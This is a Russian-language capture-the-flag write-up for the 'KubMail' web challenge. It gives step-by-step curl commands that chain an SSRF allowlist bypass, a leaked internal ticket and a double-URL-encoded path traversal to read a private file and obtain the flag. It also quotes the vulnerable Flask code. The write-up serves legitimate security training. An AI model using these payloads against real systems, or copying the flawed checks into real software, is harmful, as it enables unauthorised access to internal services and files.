# Write-up: KubMail — Архив, который всё помнит

## 1. Цепочка решения

Задача решается не одним запросом, а цепочкой:

```text
публичная страница
  → /api/docs
  → /api/preview (SSRF)
  → /internal/health
  → /internal/debug/routes
  → ticket tram-7-archive
  → /internal/archive/export
  → двойное URL-декодирование
  → path traversal
  → flag
```

## 2. Разведка

На главной странице есть ссылка **API-документация**. Запрос:

```bash
curl http://127.0.0.1:5000/api/docs
```

возвращает:

```json
{
  "name": "KubMail integration API",
  "version": "2.3",
  "endpoints": {
    "preview": "/api/preview?url=<URL>",
    "route": "/api/route?from=&to="
  },
  "preview_note": "Preview accepts approved kubmail.local integration URLs."
}
```

В документации также присутствует подсказка без раскрытия исходного кода:

```json
"legacy_monitoring": {
  "health_probe": "/internal/health",
  "purpose": "archive gateway availability check"
}
```

Это делает задачу решаемой blackbox-методом: маршрут health probe не нужно угадывать или находить перебором. Интересен endpoint `/api/preview`: сервер сам делает HTTP-запрос по URL, предоставленному пользователем. Это признак SSRF.

## 3. Обход allowlist

Проверка в приложении написана так:

```python
if 'kubmail.local' not in target:
    return jsonify({'error':'destination is not on the approved integration network'}), 403
```

Проверяется вся строка URL, а не hostname. Поэтому `kubmail.local` можно поместить в query-параметр URL, а реальным адресатом оставить localhost:

```text
http://127.0.0.1:5000/internal/health?via=kubmail.local
```

Внешний запрос к proxy:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/health?via=kubmail.local'
```

Ответ:

```json
{
  "body": "{\"build\":\"2024.03.17\",\"note\":\"legacy export requires a gateway ticket\",\"routes\":\"/internal/debug/routes\",\"service\":\"krd-archive-gateway\",\"status\":\"ok\"}\n",
  "status": 200
}
```

## 4. Доступ к debug endpoint

Из ответа известен путь `/internal/debug/routes`. Выполняем его через тот же SSRF:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/debug/routes?via=kubmail.local'
```

Ответ содержит внутренний маршрут и ticket:

```json
{
  "export": {
    "method": "GET",
    "parameter": "name",
    "ticket": "tram-7-archive"
  },
  "routes": [
    "/internal/health",
    "/internal/debug/routes",
    "/internal/archive/export"
  ]
}
```

Также видно, что внутренние endpoints доверяют заголовку `X-Kubmail-Proxy`, который автоматически добавляет SSRF-прокси.

## 5. Анализ archive export

Endpoint `/internal/archive/export` требует ticket и параметр `name`:

```python
if request.args.get('ticket') != 'tram-7-archive':
    return jsonify({'error':'invalid gateway ticket'}),401

raw = request.args.get('name','')
name = unquote(raw)
target = (PUBLIC_DIR / name).resolve()
```

Здесь повторяется ошибка с дополнительным декодированием. В отличие от обычного `/download`, внутренний export не проверяет, что итоговый путь остался внутри `data/public`.

## 6. Финальный traversal

Нужно выйти из `data/public` в `data/private` и запросить:

```text
data/private/krd_weather_backup.txt
```

Для этого передаём имя:

```text
%252e%252e%252fprivate%252fkrd_weather_backup.txt
```

Внутренний endpoint должен получить одновременно `ticket`, `name` и маркер `kubmail.local` для прохождения allowlist внешнего proxy. Удобнее всего URL-кодировать амперсанды внутри вложенного URL:

```text
http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local
```

Полная команда:

```bash
curl --get 'http://127.0.0.1:5000/api/preview' \
  --data-urlencode 'url=http://127.0.0.1:5000/internal/archive/export?ticket=tram-7-archive%26name=%252e%252e%252fprivate%252fkrd_weather_backup.txt%26via=kubmail.local'
```

После декодирования query-параметров получится внутренний запрос:

```text
/internal/archive/export?ticket=tram-7-archive&name=%2e%2e%2fprivate%2fkrd_weather_backup.txt&via=kubmail.local
```

Flask декодирует `%25` на первом уровне, а `unquote()` в archive gateway выполняет второй этап и превращает имя в:

```text
../private/krd_weather_backup.txt
```

Нормализация пути даёт:

```text
data/public/../private/krd_weather_backup.txt
→ data/private/krd_weather_backup.txt
```

## 7. Флаг

В ответе находится:

```text
KubSTU{kuban_legacy_gateway_reads_between_the_lines}
```


